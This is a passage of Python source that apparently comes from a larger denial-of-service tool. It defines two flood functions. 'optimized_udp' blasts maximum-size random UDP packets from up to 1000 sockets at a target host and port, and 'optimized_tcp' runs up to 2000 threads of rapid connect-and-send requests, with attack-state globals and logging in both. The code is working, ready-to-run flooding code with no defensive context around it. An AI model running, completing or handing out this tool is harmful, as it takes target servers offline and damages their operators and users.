def optimized_udp(host, port, duration, threads, method_name):
    global attack_method, target_ip, attack_running
    attack_method = method_name
    target_ip = host
    end_time = time.time() + int(duration)
    attack_running = True
    sockets = []
    for _ in range(min(int(threads), 1000)):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
        sockets.append(sock)
    payload = random._urandom(65507)
    log_init()
    def udp_send(sock):
        while time.time() < end_time and attack_running:
            try:
                sock.sendto(payload, (host, int(port)))
                log_attack("success")
            except:
                log_attack("closed")
    thread_count = min(int(threads), 1000)
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(udp_send, sockets[i % len(sockets)]) for i in range(thread_count)]
        for future in futures:
            try:
                future.result(timeout=0.01)
            except:
                pass
    for sock in sockets:
        sock.close()
    log_complete()

def optimized_tcp(host, port, duration, threads, method_name):
    global attack_method, target_ip, attack_running
    attack_method = method_name
    target_ip = host
    end_time = time.time() + int(duration)
    attack_running = True
    log_init()
    def tcp_connect():
        while time.time() < end_time and attack_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                sock.settimeout(0.3)
                sock.connect((host, int(port)))
                encrypted = base64.b64encode(f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n".encode()).decode()
                sock.send(encrypted.encode())
                sock.close()
                log_attack("success")
            except:
                log_attack("closed")
    thread_count = min(int(threads), 2000)
    with ThreadPoolExecutor(max_workers=thread_count) as executor:
        futures = [executor.submit(tcp_connect) for _ in range(thread_count)]
        for future in futures:
            try:
                future.result(timeout=0.01)
            except:
                pass
    log_complete()

